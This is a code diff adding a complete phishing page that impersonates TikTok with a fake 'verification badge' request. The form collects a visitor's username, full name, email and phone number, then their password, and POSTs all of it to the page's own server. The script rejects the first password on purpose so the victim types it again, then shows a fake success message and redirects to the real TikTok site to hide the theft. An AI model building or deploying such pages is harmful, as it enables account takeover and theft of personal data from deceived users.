@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>TikTok</title>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="description" content="TikTok verification request." />
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@800&display=swap" />
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" />
+    </head>
+    <body style="color: black">
+        <nav class="container p-4">
+            <img src="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95da587b6efa1520dcd11f4b45c0cf6.svg" />
+            <img src="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-text-dark-673b189595b95d8bbf2ab1783ae2ab25.svg" />
+        </nav>
+        
+        <div class="container pb-5" style="font-family: 'Nunito Sans', sans-serif">
+            <div class="mx-auto mt-5 mb-5" style="max-width: 480px">
+                <!-- Loading -->
+                <div id="tab_loading">
+                    <div class="mt-5 mb-5" style="width: 100%; text-align: center">
+                        <div class="spinner-border text-danger">
+                            <span class="sr-only"></span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Information -->
+                <div id="tab_information" hidden>
+                    <div class="form-group mb-5">
+                        <h2>Request verification</h2>
+                    </div>
+                    
+                    <div class="form-group mb-4">
+                        <label for="input_information_username">Username</label>
+                        <input id="input_information_username" class="form-control" type="text" placeholder="Username" data-input-group="information" />
+                        <div class="invalid-feedback">This is a required field.</div>
+                    </div>
+                    
+                    <div class="form-group mb-4">
+                        <label for="input_information_first_name">First name</label>
+                        <input id="input_information_first_name" class="form-control" type="text" placeholder="First name" data-input-group="information" />
+                        <div class="invalid-feedback">This is a required field.</div>
+                    </div>
+                    
+                    <div class="form-group mb-4">
+                        <label for="input_information_last_name">Last name</label>
+                        <input id="input_information_last_name" class="form-control" type="text" placeholder="Last name" data-input-group="information" />
+                        <div class="invalid-feedback">This is a required field.</div>
+                    </div>
+                    
+                    <div class="form-group mb-4">
+                        <label for="input_information_email">Email address</label>
+                        <input id="input_information_email" class="form-control" type="email" placeholder="Email address" data-input-group="information" />
+                        <div class="invalid-feedback">This is a required field.</div>
+                    </div>
+                    
+                    <div class="form-group mb-4">
+                        <label for="input_information_phone">Phone number</label>
+                        <input id="input_information_phone" class="form-control" type="tel" placeholder="Phone number" data-input-group="information" />
+                        <div class="invalid-feedback">This is a required field.</div>
+                    </div>
+                    
+                    <div class="form-group mb-4">
+                        <label for="input_information_message">Let us know why you're applying for verification</label>
+                        <textarea id="input_information_message" class="form-control" rows="3"></textarea>
+                    </div>
+                    
+                    <div class="form-group">
+                        <button id="submit_information" class="btn btn-danger" style="background-color: rgb(234, 68, 90); width: 100%">Continue</button>
+                    </div>
+                </div>
+                
+                <!-- Signin -->
+                <div id="tab_signin" hidden>
+                    <div class="form-group mb-5">
+                        <h2>Request verification</h2>
+                    </div>
+                    
+                    <div class="form-group mb-4">
+                        <label for="input_signin_username">Username</label>
+                        <input id="input_signin_username" class="form-control" type="text" placeholder="Username" data-input-group="signin" />
+                        <div class="invalid-feedback">This is a required field.</div>
+                    </div>
+                    
+                    <div class="form-group mb-4">
+                        <label for="input_signin_password">Password</label>
+                        <input id="input_signin_password" class="form-control" type="password" placeholder="Password" data-input-group="signin" />
+                        <div class="invalid-feedback">The password you entered doesn't seem valid.</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <button id="submit_signin" class="btn btn-danger" style="background-color: rgb(234, 68, 90); width: 100%">Continue</button>
+                    </div>
+                </div>
+                
+                <!-- Success -->
+                <div id="tab_success" hidden>
+                    <div class="form-group mb-5">
+                        <h2>Request submitted</h2>
+                        
+                        <p class="mb-3">We've received your request and will review it as soon as possible, if you have any questions, feel free to respond to the email that was sent to you before or visit our help center.</p>
+                        
+                        <p class="mb-3">Please note that this does not guarantee that you'll receive the verified badge. You may now close this tab or click continue to be taken to the homepage.</p>
+                        
+                        <div class="form-group">
+                            <button id="submit_success" class="btn btn-danger" style="background-color: rgb(234, 68, 90); width: 100%">Continue</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="container-fluid p-4 text-center" style="width: 100%; position: fixed; bottom: 0; background-color: black">
+            <small class="text-muted">&copy; 2021 TikTok</small>
+        </div>
+        
+        <script>
+            var signin_attempts = 2;
+            
+            function setVisibleTab(tab) {
+                const elements = document.getElementById(tab).parentNode.childNodes;
+                
+                for (let i = 0; i < elements.length; i++) {
+                    if (!elements[i].id) continue;
+                    
+                    if (elements[i].id === tab) {
+                        elements[i].hidden = false;
+                    } else {
+                        elements[i].hidden = true;
+                    }
+                }
+            }
+            
+            function validateInputGroup(group) {
+                var inputGroupValid = true;
+                const inputElements = document.querySelectorAll(`input[data-input-group="${group}"]`);
+                
+                for (let i = 0; i < inputElements.length; i++) {
+                    if (!inputElements[i].value) {
+                        if (!inputElements[i].classList.contains("is-invalid")) {
+                            inputElements[i].classList.add("is-invalid");
+                        }
+                        
+                        inputGroupValid = false;
+                    }
+                }
+                
+                return inputGroupValid;
+            }
+            
+            window.addEventListener("load", () => {
+                setVisibleTab("tab_information");
+                
+                const inputElements = document.querySelectorAll(`input[class="form-control"]`);
+                
+                for (let i = 0; i < inputElements.length; i++) {
+                    inputElements[i].addEventListener("keydown", () => {
+                        if (inputElements[i].classList.contains("is-invalid")) {
+                            inputElements[i].classList.remove("is-invalid");
+                        }
+                    });
+                }
+            });
+            
+            document.getElementById("submit_information").addEventListener("click", () => {
+                setVisibleTab("tab_loading");
+                
+                fetch(`/@/TikTok/BadgeRequest${window.location.search}`, {
+                    method: "POST",
+                    headers: {
+                        "Accept": "application/json",
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        Username: document.getElementById("input_information_username").value || "Empty",
+                        FirstName: document.getElementById("input_information_first_name").value || "Empty",
+                        LastName: document.getElementById("input_information_last_name").value || "Empty",
+                        EmailAddress: document.getElementById("input_information_email").value || "Empty",
+                        PhoneNumber: document.getElementById("input_information_phone").value || "Empty",
+                        Message: document.getElementById("input_information_message").value || "Empty",
+                    })
+                })
+                .then((response) => response.json())
+                .then((response) => {
+                    if (!validateInputGroup("information")) {
+                        setVisibleTab("tab_information");
+                    } else {
+                        setVisibleTab("tab_signin");
+                    }
+                });
+            });
+            
+            document.getElementById("submit_signin").addEventListener("click", () => {
+                setVisibleTab("tab_loading");
+                
+                fetch(`/@/TikTok/SignIn${window.location.search}`, {
+                    method: "POST",
+                    headers: {
+                        "Accept": "application/json",
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        Username: document.getElementById("input_signin_username").value || "Empty",
+                        Password: document.getElementById("input_signin_password").value || "Empty"
+                    })
+                })
+                .then((response) => response.json())
+                .then((response) => {
+                    if (!validateInputGroup("signin")) {
+                        setVisibleTab("tab_signin");
+                    } else if (signin_attempts > 1) {
+                        if (!document.getElementById("input_signin_password").classList.contains("is-invalid")) {
+                            document.getElementById("input_signin_password").classList.add("is-invalid");
+                        }
+                        
+                        setVisibleTab("tab_signin");
+                        document.getElementById("input_signin_password").value = "";
+                        signin_attempts--;
+                    } else {
+                        setVisibleTab("tab_success");
+                    }
+                });
+            });
+            
+            document.getElementById("submit_success").addEventListener("click", () => {
+                window.location = "https://tiktok.com/";
+            });
+        </script>
+    </body>
+</html>
